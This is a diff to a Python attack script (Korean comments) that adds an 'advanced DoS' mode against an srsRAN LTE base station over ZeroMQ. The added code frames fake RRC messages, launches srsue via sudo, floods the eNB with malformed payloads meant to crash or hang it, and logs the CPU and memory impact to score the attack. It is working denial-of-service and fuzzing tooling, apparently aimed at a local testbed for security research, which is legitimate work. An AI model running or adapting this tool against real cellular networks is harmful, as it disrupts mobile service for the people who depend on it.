@@ -228,7 +228,7 @@ class RealUEAttack:
             return False
     
     def send_lte_rrc_message(self, message_type, message_data=None):
-        """LTE RRC 메시지 전송"""
+        """LTE RRC 메시지 전송 (srsRAN 호환 형식)"""
         if message_type not in self.lte_rrc_messages:
             print(f"알 수 없는 메시지 타입: {message_type}")
             return False
@@ -236,21 +236,42 @@ class RealUEAttack:
         message = self.lte_rrc_messages[message_type]
         
         try:
+            # srsRAN이 기대하는 형식으로 메시지 구성
             socket = self.context.socket(zmq.PUSH)
             socket.connect(f"tcp://localhost:{self.target_port}")
             
-            # ZeroMQ 헤더 + RRC 메시지
+            # srsRAN RRC 메시지 형식: [UE_ID][RRC_MSG_TYPE][PAYLOAD]
             full_message = bytearray()
-            full_message.extend(self.real_messages[0])  # ZeroMQ 헤더
-            full_message.extend(self.real_messages[1])  # 메시지 타입
-            full_message.extend(message)  # RRC 메시지
+            
+            # UE ID (16 bits) - 실제 UE 식별자
+            ue_id = random.randint(1, 65535)
+            full_message.extend(struct.pack('>H', ue_id))
+            
+            # RRC 메시지 타입 (8 bits)
+            msg_type_map = {
+                'rrc_connection_request': 0x01,
+                'rrc_connection_setup_complete': 0x02,
+                'rrc_connection_reconfiguration_complete': 0x03,
+                'rrc_connection_reestablishment_request': 0x04,
+                'measurement_report': 0x05,
+                'ue_capability_information': 0x06
+            }
+            msg_type = msg_type_map.get(message_type, 0x00)
+            full_message.extend([msg_type])
+            
+            # RRC 페이로드
+            full_message.extend(message)
+            
+            # srsRAN 헤더 추가 (필요한 경우)
+            srsran_header = bytearray([0x00, 0x00, 0x00, 0x00])  # 더미 헤더
+            full_message = srsran_header + full_message
             
             socket.send(bytes(full_message), zmq.NOBLOCK)
             socket.close()
             
-            print(f"[{datetime.now().strftime('%H:%M:%S')}] {message_type} 전송")
+            print(f"[{datetime.now().strftime('%H:%M:%S')}] {message_type} 전송 (UE ID: {ue_id})")
             print(f"  메시지 크기: {len(full_message)} bytes")
-            print(f"  RRC 데이터: {message.hex()}")
+            print(f"  srsRAN 형식: {full_message.hex()}")
             return True
             
         except Exception as e:
@@ -330,6 +351,75 @@ class RealUEAttack:
             time.sleep(0.001)  # 1ms 간격
         
         print(f"=== 공격적인 연결 플러딩 완료: {success_count}/10 성공 ===")
+        return success_count
+    
+    def simulate_physical_layer_connection(self):
+        """물리 계층 연결 시뮬레이션"""
+        print(f"=== 물리 계층 연결 시뮬레이션 시작 ===")
+        
+        try:
+            # 1. 실제 네트워크 인터페이스를 통한 연결 시도
+            # srsRAN의 실제 UE 시뮬레이션을 위한 명령어 실행
+            cmd = [
+                "sudo", "srsue", "--rf.device=zmq", 
+                "--rf.device_args=tx_port=tcp://localhost:2001,rx_port=tcp://localhost:2000",
+                "--rf.freq=2680000000", "--rf.gain=76",
+                "--nas.apn=internet", "--nas.eia=1,2,3", "--nas.eea=0,1,2,3"
+            ]
+            
+            # 백그라운드에서 UE 프로세스 시작
+            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, 
+                                     stderr=subprocess.PIPE, text=True)
+            
+            print(f"UE 프로세스 시작: PID {process.pid}")
+            time.sleep(2)  # UE 초기화 대기
+            
+            return process
+            
+        except Exception as e:
+            print(f"물리 계층 연결 시뮬레이션 실패: {e}")
+            return None
+    
+    def send_malformed_rrc_messages(self, count=100):
+        """악성 RRC 메시지 전송 (퍼징)"""
+        print(f"=== 악성 RRC 메시지 전송 시작 ({count}개) ===")
+        
+        success_count = 0
+        
+        for i in range(count):
+            try:
+                # 다양한 악성 메시지 패턴 생성
+                malformed_patterns = [
+                    # 패턴 1: 매우 큰 메시지
+                    b'\x00' * 10000,
+                    # 패턴 2: 잘못된 헤더
+                    b'\xFF\xFF\xFF\xFF' + b'\x00' * 100,
+                    # 패턴 3: 특수 문자 포함
+                    b'\x00\x01\x02\x03' + b'\xFF' * 50,
+                    # 패턴 4: NULL 바이트 폭탄
+                    b'\x00' * 1000,
+                    # 패턴 5: 무한 루프 유발 가능한 패턴
+                    b'\x01\x00\x00\x00' + b'\xAA' * 200
+                ]
+                
+                pattern = malformed_patterns[i % len(malformed_patterns)]
+                
+                socket = self.context.socket(zmq.PUSH)
+                socket.connect(f"tcp://localhost:{self.target_port}")
+                
+                # 악성 메시지 전송
+                socket.send(pattern, zmq.NOBLOCK)
+                socket.close()
+                
+                print(f"[{datetime.now().strftime('%H:%M:%S')}] 악성 메시지 #{i+1} 전송: {len(pattern)} bytes")
+                success_count += 1
+                
+                time.sleep(0.01)  # 10ms 간격
+                
+            except Exception as e:
+                print(f"악성 메시지 #{i+1} 전송 실패: {e}")
+        
+        print(f"=== 악성 RRC 메시지 전송 완료: {success_count}/{count} 성공 ===")
         return success_count
     
     def monitor_enb_responses(self, duration=5):
@@ -835,6 +925,133 @@ class RealUEAttack:
         self.log_message(f"공격 시간: {(self.end_time - self.start_time).total_seconds():.1f}초")
         self.log_message("=" * 50)
     
+    def advanced_dos_attack(self, duration=60):
+        """고급 DoS 공격 (물리 계층 + 악성 메시지)"""
+        self.setup_logging("advanced_dos", duration)
+        
+        # 공격 시작 전 리소스 상태 캡처
+        self.log_message("공격 시작 전 리소스 상태 캡처 중...")
+        self.start_stats = self.get_system_stats()
+        self.start_time = datetime.now()
+        
+        if self.start_stats:
+            self.log_message(f"시작 CPU: {self.start_stats['cpu_percent']:.1f}%")
+            self.log_message(f"시작 메모리: {self.start_stats['memory_percent']:.1f}% ({self.start_stats['memory_used_gb']:.2f}GB)")
+            self.log_message(f"시작 네트워크 송신: {self.start_stats['bytes_sent']:,} bytes")
+            self.log_message(f"시작 네트워크 수신: {self.start_stats['bytes_recv']:,} bytes")
+            self.log_message(f"시작 srsRAN CPU: {self.start_stats['srsran_cpu']:.1f}%")
+            self.log_message(f"시작 srsRAN 메모리: {self.start_stats['srsran_memory']:.1f}%")
+        
+        self.log_message("=" * 50)
+        self.log_message(f"=== 고급 DoS 공격 시작 ===")
+        self.log_message(f"대상 포트: {self.target_port}")
+        self.log_message(f"지속 시간: {duration}초")
+        self.log_message("=" * 50)
+        
+        self.running = True
+        start_time = time.time()
+        total_messages = 0
+        
+        # 1. 물리 계층 연결 시뮬레이션
+        ue_process = self.simulate_physical_layer_connection()
+        
+        # 2. 응답 모니터링 스레드 시작
+        response_thread = threading.Thread(target=self.monitor_enb_responses, args=(duration,))
+        response_thread.daemon = True
+        response_thread.start()
+        
+        # 3. srsRAN 로그 모니터링 스레드 시작
+        log_thread = threading.Thread(target=self.monitor_srsran_logs, args=(duration,))
+        log_thread.daemon = True
+        log_thread.start()
+        
+        while self.running and (time.time() - start_time) < duration:
+            # 악성 메시지 전송
+            sent_count = self.send_malformed_rrc_messages(50)
+            total_messages += sent_count
+            
+            # 완전한 연결 시퀀스 수행
+            if self.perform_complete_connection_sequence():
+                total_messages += 1
+            
+            time.sleep(0.1)  # 100ms 간격
+        
+        # UE 프로세스 종료
+        if ue_process:
+            try:
+                ue_process.terminate()
+                ue_process.wait(timeout=5)
+                print("UE 프로세스 종료됨")
+            except:
+                ue_process.kill()
+                print("UE 프로세스 강제 종료됨")
+        
+        # 공격 종료 후 리소스 상태 캡처
+        self.log_message("=" * 50)
+        self.log_message("공격 종료 후 리소스 상태 캡처 중...")
+        self.end_stats = self.get_system_stats()
+        self.end_time = datetime.now()
+        
+        if self.end_stats:
+            self.log_message(f"종료 CPU: {self.end_stats['cpu_percent']:.1f}%")
+            self.log_message(f"종료 메모리: {self.end_stats['memory_percent']:.1f}% ({self.end_stats['memory_used_gb']:.2f}GB)")
+            self.log_message(f"종료 네트워크 송신: {self.end_stats['bytes_sent']:,} bytes")
+            self.log_message(f"종료 네트워크 수신: {self.end_stats['bytes_recv']:,} bytes")
+            self.log_message(f"종료 srsRAN CPU: {self.end_stats['srsran_cpu']:.1f}%")
+            self.log_message(f"종료 srsRAN 메모리: {self.end_stats['srsran_memory']:.1f}%")
+        
+        # 리소스 변화량 계산 및 출력
+        if self.start_stats and self.end_stats:
+            self.log_message("=" * 50)
+            self.log_message("=== 리소스 변화량 분석 ===")
+            
+            cpu_change = self.end_stats['cpu_percent'] - self.start_stats['cpu_percent']
+            memory_change = self.end_stats['memory_percent'] - self.start_stats['memory_percent']
+            memory_gb_change = self.end_stats['memory_used_gb'] - self.start_stats['memory_used_gb']
+            bytes_sent_change = self.end_stats['bytes_sent'] - self.start_stats['bytes_sent']
+            bytes_recv_change = self.end_stats['bytes_recv'] - self.start_stats['bytes_recv']
+            srsran_cpu_change = self.end_stats['srsran_cpu'] - self.start_stats['srsran_cpu']
+            srsran_memory_change = self.end_stats['srsran_memory'] - self.start_stats['srsran_memory']
+            
+            self.log_message(f"CPU 변화: {cpu_change:+.1f}%")
+            self.log_message(f"메모리 변화: {memory_change:+.1f}% ({memory_gb_change:+.2f}GB)")
+            self.log_message(f"네트워크 송신 변화: {bytes_sent_change:+,} bytes")
+            self.log_message(f"네트워크 수신 변화: {bytes_recv_change:+,} bytes")
+            self.log_message(f"srsRAN CPU 변화: {srsran_cpu_change:+.1f}%")
+            self.log_message(f"srsRAN 메모리 변화: {srsran_memory_change:+.1f}%")
+            
+            # 공격 효과 분석
+            self.log_message("=" * 50)
+            self.log_message("=== 공격 효과 분석 ===")
+            if abs(cpu_change) > 5:
+                self.log_message(f"✓ CPU 사용량이 {'증가' if cpu_change > 0 else '감소'}했습니다 ({cpu_change:+.1f}%)")
+            else:
+                self.log_message(f"✗ CPU 사용량 변화가 미미합니다 ({cpu_change:+.1f}%)")
+            
+            if abs(memory_change) > 2:
+                self.log_message(f"✓ 메모리 사용량이 {'증가' if memory_change > 0 else '감소'}했습니다 ({memory_change:+.1f}%)")
+            else:
+                self.log_message(f"✗ 메모리 사용량 변화가 미미합니다 ({memory_change:+.1f}%)")
+            
+            if abs(srsran_cpu_change) > 5:
+                self.log_message(f"✓ srsRAN CPU 사용량이 {'증가' if srsran_cpu_change > 0 else '감소'}했습니다 ({srsran_cpu_change:+.1f}%)")
+            else:
+                self.log_message(f"✗ srsRAN CPU 사용량 변화가 미미합니다 ({srsran_cpu_change:+.1f}%)")
+            
+            if abs(srsran_memory_change) > 2:
+                self.log_message(f"✓ srsRAN 메모리 사용량이 {'증가' if srsran_memory_change > 0 else '감소'}했습니다 ({srsran_memory_change:+.1f}%)")
+            else:
+                self.log_message(f"✗ srsRAN 메모리 사용량 변화가 미미합니다 ({srsran_memory_change:+.1f}%)")
+        
+        # 결과를 JSON 파일로 저장
+        self.save_attack_results(total_messages, duration, total_messages)
+        
+        self.log_message("=" * 50)
+        self.log_message(f"=== 고급 DoS 공격 완료 ===")
+        self.log_message(f"총 {total_messages}개 메시지 전송")
+        self.log_message(f"공격 시간: {(self.end_time - self.start_time).total_seconds():.1f}초")
+        self.log_message("=" * 50)
+    
     def run_all_attacks(self, duration=60):
         """모든 공격 유형을 순차적으로 실행하고 결과 비교"""
         self.setup_logging("all_attacks", duration)
@@ -1303,7 +1520,7 @@ def main():
     parser = argparse.ArgumentParser(description='실제 UE 메시지를 사용한 공격')
     parser.add_argument('--target-port', type=int, default=2001, help='eNB 포트 (기본값: 2001)')
     parser.add_argument('--duration', type=int, default=60, help='공격 지속 시간 (초)')
-    parser.add_argument('--attack-type', choices=['rrc', 'zeromq', 'mixed', 'aggressive', 'all'], 
+    parser.add_argument('--attack-type', choices=['rrc', 'zeromq', 'mixed', 'aggressive', 'advanced', 'all'], 
                        default='mixed', help='공격 유형')
     
     args = parser.parse_args()
@@ -1317,6 +1534,8 @@ def main():
             attacker.zeromq_sequence_flood(args.duration)
         elif args.attack_type == 'aggressive':
             attacker.aggressive_rrc_flood(args.duration)
+        elif args.attack_type == 'advanced':
+            attacker.advanced_dos_attack(args.duration)
         elif args.attack_type == 'all':
             attacker.run_all_attacks(args.duration)
         else:
